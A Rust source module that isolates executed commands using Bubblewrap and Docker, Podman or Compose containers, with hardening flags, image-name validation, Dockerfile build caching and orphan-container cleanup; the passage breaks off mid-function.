//! Native process restriction (`bwrap`) and container sandboxing (`Docker` / `Podman` / `Compose`).
//!
//! Adapted from Python's `src/util/sandbox.py`, sourcing prefixes, timeouts,
//! default images, and image heuristics from `[package.metadata.run.sandbox]`
//! via [`crate::util::env::PackageMetadata::get`] and R3 cache paths via
//! `cache_dir_name` (`"run"`). Uses `sha2::Sha256` for Dockerfile build-cache
//! hashing and container IDs, `regex` for strict OCI image-reference validation,
//! and `libc` / `windows-sys` for UID/GID mapping and PID liveness checks.

use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use regex::Regex;
use sha2::{Digest, Sha256};

use crate::model::config::SandboxConfig;
use crate::model::error::RunError;
use crate::model::metadata::PackageMetadata;
pub use crate::model::sandbox::{ExecOutput, HostOs, SandboxEnv};
use crate::util::output::Printer;
use crate::util::process::MonitoredChild;

/// Production [`SandboxEnv`] implementation backed by the host OS and [`MonitoredChild`].
#[derive(Debug, Clone, Copy, Default)]
pub struct SystemSandboxEnv;

impl SandboxEnv for SystemSandboxEnv {
    /// Return the compile-time [`HostOs`].
    fn os(&self) -> HostOs {
        HostOs::current()
    }

    /// Resolve `bin` on `PATH`, checking executable permission bits on Unix.
    fn which(&self, bin: &str) -> Option<PathBuf> {
        let bin_path = Path::new(bin);
        if bin_path.components().count() > 1 {
            return is_executable_file(bin_path).then(|| bin_path.to_path_buf());
        }
        let path_var = std::env::var_os("PATH")?;
        for dir in std::env::split_paths(&path_var) {
            let candidate = dir.join(bin);
            if is_executable_file(&candidate) {
                return Some(candidate);
            }
            #[cfg(windows)]
            if bin_path.extension().is_none() {
                for ext in ["exe", "cmd", "bat"] {
                    let win_candidate = dir.join(format!("{bin}.{ext}"));
                    if is_executable_file(&win_candidate) {
                        return Some(win_candidate);
                    }
                }
            }
        }
        None
    }

    /// Return `std::env::current_dir()`.
    fn cwd(&self) -> Result<PathBuf, RunError> {
        std::env::current_dir().map_err(RunError::Io)
    }

    /// Return `(getuid(), getgid())` via `libc` on Unix, or `None` on Windows.
    fn uid_gid(&self) -> Option<(u32, u32)> {
        #[cfg(unix)]
        {
            // SAFETY: `getuid` and `getgid` take no arguments and cannot fail.
            let (uid, gid) = unsafe { (libc::getuid(), libc::getgid()) };
            Some((uid, gid))
        }
        #[cfg(not(unix))]
        {
            None
        }
    }

    /// Return `std::process::id()`.
    fn current_pid(&self) -> u32 {
        std::process::id()
    }

    /// Probe process liveness using `libc::kill(pid, 0)` on Unix or `OpenProcess` on Windows.
    fn is_pid_alive(&self, pid: u32) -> bool {
        if pid == 0 {
            return false;
        }
        #[cfg(unix)]
        {
            if pid > i32::MAX as u32 {
                return false;
            }
            // SAFETY: Signal `0` validates existence/permissions without delivering a signal.
            let rc = unsafe { libc::kill(pid as libc::pid_t, 0) };
            if rc == 0 {
                return true;
            }
            std::io::Error::last_os_error().raw_os_error() == Some(libc::EPERM)
        }
        #[cfg(windows)]
        {
            use windows_sys::Win32::Foundation::{
                CloseHandle, ERROR_ACCESS_DENIED, GetLastError,
            };
            use windows_sys::Win32::System::Threading::{
                OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION,
            };
            // SAFETY: Standard Win32 handle open/close for PID existence check.
            let handle = unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid) };
            if handle.is_null() {
                // SAFETY: `GetLastError` reads thread-local last-error code.
                unsafe { GetLastError() == ERROR_ACCESS_DENIED }
            } else {
                // SAFETY: `handle` was just checked non-null.
                unsafe { CloseHandle(handle) };
                true
            }
        }
        #[cfg(not(any(unix, windows)))]
        {
            false
        }
    }

    /// Return `$XDG_CACHE_HOME` if set and non-empty.
    fn xdg_cache_home(&self) -> Option<PathBuf> {
        std::env::var_os("XDG_CACHE_HOME")
            .filter(|v| !v.is_empty())
            .map(PathBuf::from)
    }

    /// Return `$HOME` (Unix) or `%USERPROFILE%` (Windows).
    fn home_dir(&self) -> Option<PathBuf> {
        #[cfg(windows)]
        let var = std::env::var_os("USERPROFILE");
        #[cfg(not(windows))]
        let var = std::env::var_os("HOME");
        var.filter(|v| !v.is_empty()).map(PathBuf::from)
    }

    /// Execute `program` via [`MonitoredChild`] with optional timeout and return [`ExecOutput`].
    fn run_capture(
        &self,
        program: &str,
        args: &[String],
        timeout: Option<Duration>,
    ) -> Result<ExecOutput, RunError> {
        let mut cmd = Command::new(program);
        cmd.args(args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let mut child = MonitoredChild::spawn(&mut cmd)?;
        let out = child.wait_with_timeout(timeout, None)?;
        if out.timed_out {
            return Err(RunError::execution(format!(
                "Command '{program}' timed out during sandbox operation"
            )));
        }
        Ok(ExecOutput {
            code: out.status.code().unwrap_or(1),
            stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
        })
    }
}

/// Return `true` if `path` exists as a regular file (and is executable on Unix).
fn is_executable_file(path: &Path) -> bool {
    let Ok(meta) = fs::metadata(path) else {
        return false;
    };
    if !meta.is_file() {
        return false;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        meta.permissions().mode() & 0o111 != 0
    }
    #[cfg(not(unix))]
    {
        true
    }
}

/// Monotonic counter used to generate unique container names without adding a `uuid` crate.
static CONTAINER_SEQ: AtomicU64 = AtomicU64::new(1);

/// Generate a unique hex suffix of `len` characters using `sha2::Sha256`.
fn unique_hex(len: usize) -> String {
    let seq = CONTAINER_SEQ.fetch_add(1, Ordering::Relaxed);
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_or(0, |d| d.as_nanos());
    let seed = format!("{}:{}:{}", std::process::id(), nanos, seq);
    let mut hasher = Sha256::new();
    hasher.update(seed.as_bytes());
    let hex = format!("{:x}", hasher.finalize());
    hex.chars().take(len).collect()
}

/// Cached strict OCI container image reference regex.
static IMAGE_NAME_RE: OnceLock<Regex> = OnceLock::new();

/// Cached regex matching `COPY` or `ADD` instructions in Dockerfiles.
static COPY_ADD_RE: OnceLock<Regex> = OnceLock::new();

/// Return the strict OCI image validation regex.
fn image_name_regex() -> &'static Regex {
    IMAGE_NAME_RE.get_or_init(|| {
        Regex::new(
            r"^[a-zA-Z0-9]+(?:[._-][a-zA-Z0-9]+)*(?::[0-9]+)?(?:/[a-zA-Z0-9._-]+)*(?::[a-zA-Z0-9_.-]+)?(?:@[a-zA-Z0-9]+:[a-fA-F0-9]+)?$",
        )
        .expect("valid OCI image regex")
    })
}

/// Return the Dockerfile `COPY` / `ADD` detection regex.
fn copy_add_regex() -> &'static Regex {
    COPY_ADD_RE.get_or_init(|| {
        Regex::new(r"(?im)^\s*(?:COPY|ADD)\b").expect("valid Dockerfile COPY/ADD regex")
    })
}

/// Native OS restriction wrapper (`bwrap` on Linux; fail-closed elsewhere).
#[derive(Debug, Clone, Copy, Default)]
pub struct NativeRestrictor;

impl NativeRestrictor {
    /// Wrap `cmd` in Bubblewrap (`bwrap`) sandboxing on Linux, or return [`RunError::Config`] elsewhere.
    pub fn wrap_command(
        cmd: &[String],
        net: bool,
        cwd: Option<&Path>,
        compiling: bool,
    ) -> Result<Vec<String>, RunError> {
        Self::wrap_command_with(cmd, net, cwd, compiling, &SystemSandboxEnv)
    }

    /// Testable implementation of [`Self::wrap_command`] parameterized over [`SandboxEnv`].
    pub fn wrap_command_with(
        cmd: &[String],
        net: bool,
        cwd: Option<&Path>,
        compiling: bool,
        env: &dyn SandboxEnv,
    ) -> Result<Vec<String>, RunError> {
        match env.os() {
            HostOs::Linux => {
                if env.which("bwrap").is_none() {
                    return Err(RunError::config(
                        "Bubblewrap ('bwrap') binary not found in PATH. Please install bubblewrap (bwrap) or use --sandbox with Docker/Podman.",
                    ));
                }
                let actual_cwd = match cwd {
                    Some(c) => c.to_string_lossy().into_owned(),
                    None => env.cwd()?.to_string_lossy().into_owned(),
                };
                let mut bwrap = vec![
                    "bwrap",
                    "--ro-bind",
                    "/",
                    "/",
                    "--dev",
                    "/dev",
                    "--proc",
                    "/proc",
                    "--tmpfs",
                    "/tmp",
                    "--tmpfs",
                    "/home",
                    "--tmpfs",
                    "/root",
                    "--tmpfs",
                    "/run",
                    "--tmpfs",
                    "/sys",
                    "--unshare-user",
                    "--unshare-ipc",
                    "--unshare-pid",
                    "--unshare-uts",
                    "--unshare-cgroup-try",
                    "--die-with-parent",
                    "--new-session",
                ]
                .into_iter()
                .map(String::from)
                .collect::<Vec<_>>();

                if !net {
                    bwrap.push("--unshare-net".to_string());
                }
                if compiling {
                    bwrap.push("--bind".to_string());
                    bwrap.push(actual_cwd.clone());
                    bwrap.push(actual_cwd.clone());

                    let cache_root = env
                        .xdg_cache_home()
                        .or_else(|| env.home_dir().map(|h| h.join(".cache")))
                        .unwrap_or_else(|| PathBuf::from("/tmp/.cache"));
                    let cache_dir = cache_root.join(&PackageMetadata::get().cache_dir_name);
                    let cache_str = cache_dir.to_string_lossy().into_owned();
                    bwrap.push("--bind-try".to_string());
                    bwrap.push(cache_str.clone());
                    bwrap.push(cache_str);
                } else {
                    bwrap.push("--ro-bind".to_string());
                    bwrap.push(actual_cwd.clone());
                    bwrap.push(actual_cwd.clone());
                }

                bwrap.push("--chdir".to_string());
                bwrap.push(actual_cwd);
                bwrap.push("--".to_string());
                bwrap.extend(cmd.iter().cloned());
                Ok(bwrap)
            }
            HostOs::MacOs => Err(RunError::config(
                "--restrict is only supported on Linux (via Bubblewrap). On macOS, please use --sandbox (Docker/Podman) for isolation.",
            )),
            HostOs::Windows | HostOs::Other => Err(RunError::config(
                "--restrict is only supported on Linux (via Bubblewrap). Use --sandbox instead.",
            )),
        }
    }
}

/// Container-based sandbox wrapper using Docker or Podman.
#[derive(Debug, Clone, Copy, Default)]
pub struct ContainerSandbox;

impl ContainerSandbox {
    /// Detect an available container engine (`docker` or `podman`) on the host.
    pub fn get_engine() -> Result<String, RunError> {
        Self::get_engine_with(&SystemSandboxEnv)
    }

    /// Testable container engine detector checking `info` then `--version` fallback.
    pub fn get_engine_with(env: &dyn SandboxEnv) -> Result<String, RunError> {
        let probe_timeout =
            Some(Duration::from_secs(PackageMetadata::get().sandbox.probe_timeout_secs));
        let info_args = vec!["info".to_string()];
        let ver_args = vec!["--version".to_string()];

        for candidate in ["docker", "podman"] {
            if env.which(candidate).is_some()
                && let Ok(res) = env.run_capture(candidate, &info_args, probe_timeout)
                && res.code == 0
            {
                return Ok(candidate.to_string());
            }
        }
        for candidate in ["docker", "podman"] {
            if env.which(candidate).is_some()
                && let Ok(res) = env.run_capture(candidate, &ver_args, probe_timeout)
                && res.code == 0
            {
                return Ok(candidate.to_string());
            }
        }
        Err(RunError::config(
            "No container engine (Docker/Podman) found. Please install one to use --sandbox.",
        ))
    }

    /// Trim and strictly validate an OCI container image reference to prevent option injection.
    pub fn validate_image_name(image: &str) -> Result<String, RunError> {
        let clean = image.trim();
        if clean.is_empty() {
            return Err(RunError::config("Container image name cannot be empty."));
        }
        if clean.starts_with('-') {
            return Err(RunError::config(format!(
                "Invalid container image '{image}': Image name cannot start with '-'."
            )));
        }
        if clean
            .chars()
            .any(|c| c.is_control() || " \t\n\r;|<>&`$()\"'\\".contains(c))
        {
            return Err(RunError::config(format!(
                "Invalid container image '{image}': Image name contains invalid characters."
            )));
        }
        if !image_name_regex().is_match(clean) {
            return Err(RunError::config(format!(
                "Invalid container image '{image}': Must be a valid OCI container image reference."
            )));
        }
        Ok(clean.to_string())
    }

    /// Select a heuristic container image for `cmd` from `[package.metadata.run.sandbox].image_heuristics`.
    pub fn get_heuristic_image(cmd: &[String]) -> String {
        let meta = &PackageMetadata::get().sandbox;
        if let Some(first) = cmd.first() {
            let exe = first.to_ascii_lowercase();
            for rule in &meta.image_heuristics {
                if rule
                    .executables
                    .iter()
                    .any(|pattern| exe.contains(pattern.as_str()))
                {
                    return rule.image.clone();
                }
            }
        }
        meta.default_image.clone()
    }

    /// Select a heuristic container image for a source file extension (e.g. `".py"`).
    pub fn get_heuristic_image_for_ext(ext: &str) -> String {
        let meta = &PackageMetadata::get().sandbox;
        let lower = ext.to_ascii_lowercase();
        for rule in &meta.image_heuristics {
            if rule.extensions.iter().any(|e| e == &lower) {
                return rule.image.clone();
            }
        }
        meta.default_image.clone()
    }

    /// Build or reuse a content-hashed container image from `dockerfile_path`.
    pub fn build_dockerfile(dockerfile_path: &Path, engine: &str) -> Result<String, RunError> {
        Self::build_dockerfile_with(dockerfile_path, engine, &SystemSandboxEnv)
    }

    /// Testable Dockerfile builder computing SHA-256 tag `run-sandbox-<hash[:12]>`.
    pub fn build_dockerfile_with(
        dockerfile_path: &Path,
        engine: &str,
        env: &dyn SandboxEnv,
    ) -> Result<String, RunError> {
        let cwd = env.cwd()?;
        let df_fs_path = if dockerfile_path.is_relative() {
            cwd.join(dockerfile_path)
        } else {
            dockerfile_path.to_path_buf()
        };
        if !df_fs_path.exists() {
            return Err(RunError::config(format!(
                "Dockerfile '{}' not found.",
                dockerfile_path.display()
            )));
        }
        let content = fs::read(&df_fs_path).map_err(RunError::Io)?;
        let cwd_canon = fs::canonicalize(&cwd).unwrap_or_else(|_| cwd.clone());
        let df_canon = fs::canonicalize(&df_fs_path)
            .unwrap_or_else(|_| std::path::absolute(&df_fs_path).unwrap_or_else(|_| df_fs_path.clone()));

        let context_dir = if df_canon.starts_with(&cwd_canon) {
            cwd.clone()
        } else {
            dockerfile_path
                .parent()
                .filter(|p| !p.as_os_str().is_empty())
                .map(Path::to_path_buf)
                .unwrap_or_else(|| PathBuf::from("."))
        };
        let context_fs_dir = if context_dir.is_relative() {
            cwd.join(&context_dir)
        } else {
            context_dir.clone()
        };

        let dockerignore = context_fs_dir.join(".dockerignore");
        if !dockerignore.exists() {
            env.warn(&format!(
                "No .dockerignore found in build context '{}'. Sensitive or large files may be included in build context.",
                context_dir.display()
            ));
        }

        let content_str = String::from_utf8_lossy(&content);
        let has_copy_or_add = copy_add_regex().is_match(&content_str);

        let ctx_canon = fs::canonicalize(&context_fs_dir).unwrap_or_else(|_| context_fs_dir.clone());
        let mut hasher = Sha256::new();
        hasher.update(&content);
        hasher.update(df_canon.to_string_lossy().as_bytes());
        hasher.update(ctx_canon.to_string_lossy().as_bytes());

        if has_copy_or_add
            && let Ok(meta) = fs::metadata(&context_fs_dir)
            && let Ok(mtime) = meta.modified()
            && let Ok(since_epoch) = mtime.duration_since(UNIX_EPOCH)
        {
            hasher.update(since_epoch.as_nanos().to_string().as_bytes());
        }

        let sandbox_meta = &PackageMetadata::get().sandbox;
        let digest = format!("{:x}", hasher.finalize());
        let short_hash: String = digest
            .chars()
            .take(sandbox_meta.dockerfile_hash_len)
            .collect();
        let image_name = format!("{}{}", sandbox_meta.image_prefix, short_hash);

        let inspect = env.run_capture(
            engine,
            &["images".into(), "-q".into(), image_name.clone()],
            None,
        )?;
        if inspect.code != 0 || inspect.stdout.trim().is_empty() {
            Printer::global().info(&format!(
                "Building sandbox image '{image_name}' from {}...",
                dockerfile_path.display()
            ));
            let build = env.run_capture(
                engine,
                &[
                    "build".into(),
                    "-t".into(),
                    image_name.clone(),
                    "-f".into(),
                    dockerfile_path.to_string_lossy().into_owned(),
                    context_dir.to_string_lossy().into_owned(),
                ],
                None,
            )?;
            if build.code != 0 {
                return Err(RunError::config(format!(
                    "Failed to build Dockerfile '{}'.",
                    dockerfile_path.display()
                )));
            }
        }

        Ok(image_name)
    }

    /// Wrap `cmd` in an ephemeral hardened container invocation (`docker/podman run --rm ...`).
    pub fn wrap_command(
        cmd: &[String],
        net: bool,
        compiling: bool,
        sandbox_cfg: Option<&SandboxConfig>,
        custom_env: Option<&BTreeMap<String, String>>,
    ) -> Result<Vec<String>, RunError> {
        Self::wrap_command_with(cmd, net, compiling, sandbox_cfg, custom_env, &SystemSandboxEnv)
    }

    /// Testable implementation of [`Self::wrap_command`] parameterized over [`SandboxEnv`].
    pub fn wrap_command_with(
        cmd: &[String],
        net: bool,
        compiling: bool,
        sandbox_cfg: Option<&SandboxConfig>,
        custom_env: Option<&BTreeMap<String, String>>,
        env: &dyn SandboxEnv,
    ) -> Result<Vec<String>, RunError> {
        let engine = Self::get_engine_with(env)?;
        let cwd = env.cwd()?.to_string_lossy().into_owned();
        let mount_mode = if compiling { "rw" } else { "ro" };

        let mut container_cmd = vec![
            engine.clone(),
            "run".into(),
            "--rm".into(),
            "--security-opt=no-new-privileges".into(),
            "--cap-drop=ALL".into(),
            "-v".into(),
            format!("{cwd}:{cwd}:{mount_mode}"),
            "-w".into(),
            cwd,
        ];

        if let Some(user_opt) = sandbox_cfg
            .and_then(|c| c.user.as_deref())
            .map(str::trim)
            .filter(|u| !u.is_empty())
        {
            container_cmd.push("--user".into());
            container_cmd.push(user_opt.to_string());
        } else if let Some((uid, gid)) = env.uid_gid() {
            container_cmd.push("--user".into());
            container_cmd.push(format!("{uid}:{gid}"));
        }

        if !net {
            container_cmd.push("--network".into());
            container_cmd.push("none".into());
        }

        let sandbox_meta = &PackageMetadata::get().sandbox;
        let container_name = sandbox_cfg
            .and_then(|c| c.container_name.clone())
            .unwrap_or_else(|| format!("{}{}", sandbox_meta.image_prefix, unique_hex(12)));
        container_cmd.push("--name".into());
        container_cmd.push(container_name);

        if let Some(custom) = custom_env {
            for (k, v) in custom {
                container_cmd.push("-e".into());
                container_cmd.push(format!("{k}={v}"));
            }
        }

        let raw_image = if let Some(df) = sandbox_cfg.and_then(|c| c.dockerfile.as_deref()) {
            Self::build_dockerfile_with(Path::new(df), &engine, env)?
        } else if let Some(img) = sandbox_cfg.and_then(|c| c.image.as_deref()) {
            img.to_string()
        } else {
            Self::get_heuristic_image(cmd)
        };

        let validated_image = Self::validate_image_name(&raw_image)?;
        container_cmd.push(validated_image);
        container_cmd.extend(cmd.iter().cloned());
        Ok(container_cmd)
    }

    /// Force-kill an ephemeral container by name (used on execution timeout).
    pub fn kill_container(engine: &str, container_name: &str) {
        Self::kill_container_with(engine, container_name, &SystemSandboxEnv);
    }

    /// Testable container kill helper bounded by `sandbox.cleanup_timeout_secs`.
    pub fn kill_container_with(engine: &str, container_name: &str, env: &dyn SandboxEnv) {
        let timeout = Some(Duration::from_secs(
            PackageMetadata::get().sandbox.cleanup_timeout_secs,
        ));
        let _ = env.run_capture(
            engine,
            &["kill".into(), container_name.to_string()],
            timeout,
        );
    }

    /// Extract the `--name` value from a wrapped container command, if present.
    pub fn extract_container_name(wrapped: &[String]) -> Option<&str> {
        let idx = wrapped.iter().position(|tok| tok == "--name")?;
        wrapped.get(idx + 1).map(String::as_str)
    }
}

/// Global [`ComposeSandbox`] instance for process-wide active compose tracking.
static GLOBAL_COMPOSE: OnceLock<Mutex<ComposeSandbox>> = OnceLock::new();

/// Manages `docker compose` environments (`up -d`, `exec -T`, `down`).
#[derive(Debug, Default)]
pub struct ComposeSandbox {
    /// Active compose file paths started in this session.
    active_files: Vec<String>,
}

impl ComposeSandbox {
    /// Access the process-global [`ComposeSandbox`] singleton.
    pub fn global() -> &'static Mutex<ComposeSandbox> {
        GLOBAL_COMPOSE.get_or_init(|| Mutex::new(ComposeSandbox::default()))
    }

    /// Bring up `compose_file` in detached mode and record it in the global tracker.
    pub fn setup(compose_file: &str) -> Result<(), RunError> {
        let mut guard = Self::global().lock().unwrap_or_else(|e| e.into_inner());
        guard.setup_with(compose_file, &SystemSandboxEnv)
    }

    /// Tear down `compose_file` and remove it from the global tracker.
    pub fn teardown(compose_file: &str) {
        let mut guard = Self::global().lock().unwrap_or_else(|e| e.into_inner());
        guard.teardown_with(compose_file, &SystemSandboxEnv);
    }

    /// Tear down all active compose files recorded in the global tracker.
    pub fn teardown_all() {
        let mut guard = Self::global().lock().unwrap_or_else(|e| e.into_inner());
        guard.teardown_all_with(&SystemSandboxEnv);
    }

    /// Instance/testable `docker compose -f <file> up -d`.
    pub fn setup_with(&mut self, compose_file: &str, env: &dyn SandboxEnv) -> Result<(), RunError> {
        Printer::global().info(&format!("Starting docker-compose from {compose_file}..."));
        let res = env.run_capture(
            "docker",
            &[
                "compose".into(),
                "-f".into(),
                compose_file.to_string(),
                "up".into(),
                "-d".into(),
            ],
            None,
        )?;
        if res.code != 0 {
            return Err(RunError::config(format!(
                "Failed to start docker-compose using {compose_file}"
            )));
        }
        if !self.active_files.iter().any(|f| f == compose_file) {
            self.active_files.push(compose_file.to_string());
        }
        Ok(())
    }

    /// Instance/testable `docker compose -f <file> down`.
    pub fn teardown_with(&mut self, compose_file: &str, env: &dyn SandboxEnv) {
        self.active_files.retain(|f| f != compose_file);
        let timeout = Some(Duration::from_secs(
            PackageMetadata::get().sandbox.cleanup_timeout_secs,
        ));
        let _ = env.run_capture(
            "docker",
            &[
                "compose".into(),
                "-f".into(),
                compose_file.to_string(),
                "down".into(),
            ],
            timeout,
        );
    }

    /// Tear down all tracked compose files on this instance.
    pub fn teardown_all_with(&mut self, env: &dyn SandboxEnv) {
        let files = std::mem::take(&mut self.active_files);
        for f in files {
            self.teardown_with(&f, env);
        }
    }

    /// Return currently active compose files on this instance.
    pub fn active_files(&self) -> &[String] {
        &self.active_files
    }

    /// Wrap `cmd` in `docker compose -f <compose_file> exec -T ... <service> <cmd...>`.
    ///
    /// Never injects host `cwd` as `-w`; `-w` is only emitted if `workdir` or
    /// `sandbox_cfg.compose_workdir` is explicitly configured.
    pub fn wrap_command(
        cmd: &[String],
        compose_file: &str,
        service: &str,
        workdir: Option<&str>,
        custom_env: Option<&BTreeMap<String, String>>,
        sandbox_cfg: Option<&SandboxConfig>,
    ) -> Vec<String> {
        Self::wrap_command_with(
            cmd,
            compose_file,
            service,
            workdir,
            custom_env,
            sandbox_cfg,
            &SystemSandboxEnv,
        )
    }

    /// Testable implementation of [`Self::wrap_command`] parameterized over [`SandboxEnv`].
    pub fn wrap_command_with(
        cmd: &[String],
        compose_file: &str,
        service: &str,
        workdir: Option<&str>,
        custom_env: Option<&BTreeMap<String, String>>,
        sandbox_cfg: Option<&SandboxConfig>,
        env: &dyn SandboxEnv,
    ) -> Vec<String> {
        let mut exec_cmd = vec![
            "docker".into(),
            "compose".into(),
            "-f".into(),
            compose_file.to_string(),
            "exec".into(),
            "-T".into(),
        ];

        if let Some(user_opt) = sandbox_cfg
            .and_then(|c| c.user.as_deref())
            .map(str::trim)
            .filter(|u| !u.is_empty())
        {
            exec_cmd.push("--user".into());
            exec_cmd.push(user_opt.to_string());
        } else if let Some((uid, gid)) = env.uid_gid() {
            exec_cmd.push("--user".into());
            exec_cmd.push(format!("{uid}:{gid}"));
        }

        if let Some(custom) = custom_env {
            for (k, v) in custom {
                exec_cmd.push("-e".into());
                exec_cmd.push(format!("{k}={v}"));
            }
        }

        let target_workdir = workdir.or_else(|| sandbox_cfg.and_then(|c| c.compose_workdir.as_deref()));
        if let Some(wd) = target_workdir {
            exec_cmd.push("-w".into());
            exec_cmd.push(wd.to_string());
        }

        exec_cmd.push(service.to_string());
        exec_cmd.extend(cmd.iter().cloned());
        exec_cmd
    }
}

/// Global [`PersistentSandbox`] instance for watch-mode sleeper containers.
static GLOBAL_PERSISTENT: OnceLock<Mutex<PersistentSandbox>> = OnceLock::new();

/// Long-running sleeper container sandbox (`tail -f /dev/null`) for watch-mode reloads.
#[derive(Debug)]
pub struct PersistentSandbox {
    /// Active persistent container ID, if running.
    container_id: Option<String>,
    /// Container engine hosting `container_id` (`"docker"` or `"podman"`).
    engine: String,
}

impl Default for PersistentSandbox {
    /// Create an inactive [`PersistentSandbox`] defaulting to `"docker"`.
    fn default() -> Self {
        Self {
            container_id: None,
            engine: "docker".to_string(),
        }
    }
}

impl PersistentSandbox {
    /// Access the process-global [`PersistentSandbox`] singleton.
    pub fn global() -> &'static Mutex<PersistentSandbox> {
        GLOBAL_PERSISTENT.get_or_init(|| Mutex::new(PersistentSandbox::default()))
    }

    /// Return the active container ID on this instance, if running.
    pub fn container_id(&self) -> Option<&str> {
        self.container_id.as_deref()
    }

    /// Reap orphaned persistent sleeper containers whose owner PID is no longer alive.
    pub fn reap_orphaned_containers(engine: Option<&str>) -> usize {
        Self::reap_orphaned_containers_with(engine, &SystemSandboxEnv)
    }

    /// Testable orphan container reaper parameterized over [`SandboxEnv`].
    pub fn reap_orphaned_containers_with(engine: Option<&str>, env: &dyn SandboxEnv) -> usize {
        let eng = match engine {
            Some(e) => e.to_string(),
            None => match ContainerSandbox::get_engine_with(env) {
                Ok(e) => e,
                Err(_) => return 0,
            },
        };
        let timeout = Some(Duration::from_secs(
            PackageMetadata::get().sandbox.cleanup_timeout_secs,
        ));
        let Ok(res) = env.run_capture(
            &eng,
            &[
                "ps".into(),
                "-a".into(),
                "--filter".into(),
                "label=run.sandbox.persistent=true".into(),
                "--format".into(),
                "{{.ID}} {{.Label \"run.sandbox.pid\"}}".into(),
            ],
            timeout,
        ) else {
            return 0;
        };
        if res.code != 0 || res.stdout.trim().is_empty() {
            return 0;
        }

        let current_pid = env.current_pid();
        let mut reaped = 0usize;

        for line in res.stdout.trim().lines() {
            let mut parts = line.split_whitespace();
            let Some(cid) = parts.next() else {
                continue;
            };
            let pid_str = parts.next().unwrap_or("");
            let should_reap = if pid_str.is_empty() {
                true
            } else if let Ok(target_pid) = pid_str.parse::<u32>() {
                target_pid == 0 || (target_pid != current_pid && !env.is_pid_alive(target_pid))
            } else {
                true
            };

            if should_reap
                && env
                    .run_capture(&eng, &["rm".into(), "-f".into(), cid.to_string()], timeout)
                    .is_ok()
            {
                reaped += 1;
            }
        }

        reaped
    }

    /// Start the process-global persistent sleeper container.
    pub fn start(
        engine: &str,
        image: &str,
        net: bool,
        cwd: Option<&Path>,
        writable: bool,
    ) -> Result<(), RunError> {
        let mut guard = Self::global().lock().unwrap_or_else(|e| e.into_inner());
        guard.start_with(engine, image, net, cwd, writable, &SystemSandboxEnv)
    }

    /// Stop the process-global persistent sleeper container, if running.
    pub fn stop() {
        let mut guard = Self::global().lock().unwrap_or_else(|e| e.into_inner());
        guard.stop_with(&SystemSandboxEnv);
    }

    /// Wrap `cmd` for execution inside the process-global persistent container.
    pub fn wrap_global_command(
        cmd: &[String],
        custom_env: Option<&BTreeMap<String, String>>,
    ) -> Result<Vec<String>, RunError> {
        let guard = Self::global().lock().unwrap_or_else(|e| e.into_inner());
        guard.wrap_command_with(cmd, custom_env, &SystemSandboxEnv)
    }

    /// Start a persistent sleeper container (`tail -f /dev/null`) on this instance.
    pub fn start_with(
        &mut self,
        engine: &str,
        image: &str,
        net: bool,
        cwd: Option<&Path>,
        writable: bool,
        env: &dyn SandboxEnv,
    ) -> Result<(), RunError> {
        Self::reap_orphaned_containers_with(Some(engine), env);
        let validated_image = ContainerSandbox::validate_image_name(image)?;
        let actual_cwd = match cwd {
            Some(c) if !c.as_os_str().is_empty() => c.to_string_lossy().into_owned(),
            _ => env.cwd()?.to_string_lossy().into_owned(),
        };
        let mount_mode = if writable { "rw" } else { "ro" };
        let pid = env.current_pid();
        let persist_prefix = &PackageMetadata::get().sandbox.persist_prefix;
        let container_name = format!("{persist_prefix}{pid}-{}", unique_hex(6));

        Printer::global().info(&format!(
            "Starting persistent sandbox container ({validated_image})..."
        ));

        let mut cmd = vec![
            "run".into(),
            "-d".into(),
            "--rm".into(),
            "--name".into(),
            container_name,
            "--label".into(),
            "run.sandbox.persistent=true".into(),
            "--label".into(),
            format!("run.sandbox.pid={pid}"),
            "--security-opt=no-new-privileges".into(),
            "--cap-drop=ALL".into(),
            "-v".into(),
            format!("{actual_cwd}:{actual_cwd}:{mount_mode}"),
            "-w".into(),
            actual_cwd,
        ];

        if let Some((uid, gid)) = env.uid_gid() {
            cmd.push("--user".into());
            cmd.push(format!("{uid}:{gid}"));
        }
        if !net {
            cmd.push("--network".into());
            cmd.push("none".into());
        }
        cmd.push(validated_image);
        cmd.push("tail".into());
        cmd.push("-f".into());
        cmd.push("/dev/null".into());

        let res = env.run_capture(engine, &cmd, None)?;
        if res.code != 0 {
            return Err(RunError::config(format!(
                "Failed to start persistent container: {}",
                res.stderr
            )));
        }

        self.container_id = Some(res.stdout.trim().to_string());
        self.engine = engine.to_string();
        Ok(())
    }

    /// Stop this instance's persistent sleeper container, clearing state first to prevent double-stop.
    pub fn stop_with(&mut self, env: &dyn SandboxEnv) {
        let Some(cid) = self.container_id.take() else {
            return;
        };
        Printer::global().info("Stopping persistent sandbox container...");
        let timeout = Some(Duration::from_secs(
            PackageMetadata::get().sandbox.cleanup_timeout_secs,
        ));
        let _ = env.run_capture(&self.engine, &["stop".into(), cid], timeout);
    }

    /// Wrap `cmd` in `<engine> exec [-e K=V...] -w <cwd> <container_id> <cmd...>`.
    pub fn wrap_command(
        &self,
        cmd: &[String],
        custom_env: Option<&BTreeMap<String, String>>,
    ) -> Result<Vec<String>, RunError> {
        self.wrap_command_with(cmd, custom_env, &SystemSandboxEnv)
    }

    /// Testable implementation of [`Self::wrap_command`] parameterized over [`SandboxEnv`].
    pub fn wrap_command_with(
        &self,
        cmd: &[String],
        custom_env: Option<&BTreeMap<String, String>>,
        env: &dyn SandboxEnv,
    ) -> Result<Vec<String>, RunError> {
        let Some(cid) = &self.container_id else {
            return Err(RunError::execution("Persistent container is not running."));
        };
        let cwd = env.cwd()?.to_string_lossy().into_owned();
        let mut exec_cmd = vec![self.engine.clone(), "exec".into()];
        if let Some(custom) = custom_env {
            for (k, v) in custom {
                exec_cmd.push("-e".into());
                exec_cmd.push(format!("{k}={v}"));
            }
        }
        exec_cmd.push("-w".into());
        exec_cmd.push(cwd);
        exec_cmd.push(cid.clone());
        exec_cmd.extend(cmd.iter().cloned());
